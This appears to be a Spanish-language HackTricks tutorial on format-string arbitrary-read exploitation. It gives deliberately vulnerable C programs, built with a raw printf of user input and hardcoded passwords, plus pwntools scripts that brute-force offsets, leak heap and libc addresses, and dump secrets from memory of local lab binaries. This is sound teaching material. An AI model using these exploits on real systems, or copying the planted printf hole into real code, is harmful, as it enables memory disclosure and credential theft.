# Format Strings - Arbitrary Read Example

{{#include ../../banners/hacktricks-training.md}}

## Inicio de lectura del binario

### Código
```c
#include <stdio.h>

int main(void) {
char buffer[30];

fgets(buffer, sizeof(buffer), stdin);

printf(buffer);
return 0;
}
```
Compílalo con:
```python
clang -o fs-read fs-read.c -Wno-format-security -no-pie
```
### Exploit
```python
from pwn import *

p = process('./fs-read')

payload = f"%11$s|||||".encode()
payload += p64(0x00400000)

p.sendline(payload)
log.info(p.clean())
```
- El **offset es 11** porque al poner varios As y usar **brute-forcing** con un bucle probando offsets de 0 a 50 se encontró que en el offset 11 y con 5 caracteres extra (pipes `|` en nuestro caso), es posible controlar una dirección completa.
- Usé **`%11$p`** con padding hasta que la dirección fue 0x4141414141414141
- El **format string payload está ANTES de la dirección** porque la **printf deja de leer en un null byte**, así que si enviamos la dirección y luego el format string, la printf nunca alcanzará el format string porque se encontrará un null byte antes
- La dirección seleccionada es 0x00400000 porque es donde comienza el binary (no PIE)

<figure><img src="broken-reference" alt="" width="477"><figcaption></figcaption></figure>

## Leer contraseñas

<details>
<summary>Vulnerable binary with stack and BSS passwords</summary>
```c
#include <stdio.h>
#include <string.h>

char bss_password[20] = "hardcodedPassBSS"; // Password in BSS

int main() {
char stack_password[20] = "secretStackPass"; // Password in stack
char input1[20], input2[20];

printf("Enter first password: ");
scanf("%19s", input1);

printf("Enter second password: ");
scanf("%19s", input2);

// Vulnerable printf
printf(input1);
printf("\n");

// Check both passwords
if (strcmp(input1, stack_password) == 0 && strcmp(input2, bss_password) == 0) {
printf("Access Granted.\n");
} else {
printf("Access Denied.\n");
}

return 0;
}
```
</details>

Compílalo con:
```bash
clang -o fs-read fs-read.c -Wno-format-security
```
### Leer desde la stack

El **`stack_password`** se almacenará en la stack porque es una variable local, por lo que basta con abusar de printf para mostrar el contenido de la stack. Este exploit hace BF las primeras 100 posiciones para leak las passwords desde la stack:
```python
from pwn import *

for i in range(100):
print(f"Try: {i}")
payload = f"%{i}$s\na".encode()
p = process("./fs-read")
p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
En la imagen es posible ver que podemos leak the password desde el stack en la posición `10th`:

<figure><img src="../../images/image (1234).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../images/image (1233).png" alt="" width="338"><figcaption></figcaption></figure>

### Leer datos

Ejecutando el mismo exploit pero con `%p` en lugar de `%s` es posible leak a heap address desde el stack en `%25$p`. Además, comparando la leaked address (`0xaaaab7030894`) con la posición del password en memoria en ese proceso podemos obtener la diferencia de addresses:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

Ahora es el momento de encontrar cómo controlar 1 address en el stack para acceder a ella desde la segunda format string vulnerability:

<details>
<summary>Buscar una address controlable en el stack</summary>
```python
from pwn import *

def leak_heap(p):
p.sendlineafter(b"first password:", b"%5$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

for i in range(30):
p = process("./fs-read")

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

password_addr = heap_leak_addr - 0x126a

print(f"Try: {i}")
payload = f"%{i}$p|||".encode()
payload += b"AAAAAAAA"

p.sendline(payload)
output = p.clean()
print(output.decode("utf-8"))
p.close()
```
</details>

Y es posible ver que en el **try 14**, con el passing usado, podemos controlar una dirección:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

### Exploit

<details>
<summary>Leak heap then read password</summary>
```python
from pwn import *

p = process("./fs-read")

def leak_heap(p):
# At offset 25 there is a heap leak
p.sendlineafter(b"first password:", b"%25$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

# Offset calculated from the leaked position to the possition of the pass in memory
password_addr = heap_leak_addr + 0x1f7bc

print(f"Calculated address is: {hex(password_addr)}")

# At offset 14 we can control the addres, so use %s to read the string from that address
payload = f"%14$s|||".encode()
payload += p64(password_addr)

p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
</details>

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

### Automatizando el descubrimiento del offset

Cuando el stack layout cambia en cada ejecución (full ASLR/PIE), bruteforcing offsets manualmente es lento. `pwntools` expone `FmtStr` para detectar automáticamente el argument index que alcanza nuestro controlled buffer. La lambda debe devolver la salida del programa después de enviar el payload candidato. Se detiene tan pronto como pueda corromper/observar memoria de forma fiable.
```python
from pwn import *

context.binary = elf = ELF('./fs-read', checksec=False)

# helper that sends payload and returns the first line printed
io = process()
def exec_fmt(payload):
io.sendline(payload)
return io.recvuntil(b'\n', drop=False)

fmt = FmtStr(exec_fmt=exec_fmt)
offset = fmt.offset
log.success(f"Discovered offset: {offset}")
```
Puedes reutilizar `offset` para construir arbitrary read/write payloads con `fmtstr_payload`, evitando el fuzzing manual con `%p`.

### PIE/libc leak then arbitrary read

En binarios modernos con PIE y ASLR, primero leak cualquier puntero de libc (p. ej. `__libc_start_main+243` o `setvbuf`), calcula las bases y luego coloca la dirección objetivo después del format string. Esto evita que el `%s` sea truncado por bytes nulos dentro del puntero.

<details>
<summary>Leak libc and read arbitrary address</summary>
```python
from pwn import *

elf = context.binary = ELF('./fs-read', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io = process()

# leak libc address from stack (offset 25 from previous fuzz)
io.sendline(b"%25$p")
io.recvline()
leak = int(io.recvline().strip(), 16)
libc.address = leak - libc.symbols['__libc_start_main'] - 243
log.info(f"libc @ {hex(libc.address)}")

secret = libc.address + 0x1f7bc   # adjust to your target

payload = f"%14$s|||".encode()
payload += p64(secret)

io.sendline(payload)
print(io.recvuntil(b"|||"))  # prints string at calculated address
```
</details>

## References

- [NVISO - Format string exploitation](https://blog.nviso.eu/2024/05/23/format-string-exploitation-a-hands-on-exploration-for-linux/)
- [Format string exploitation notes](https://hackmd.io/%40e20gJPRhRbKrBY5xcGKngA/SyM_Wcg_A)

{{#include ../../banners/hacktricks-training.md}}
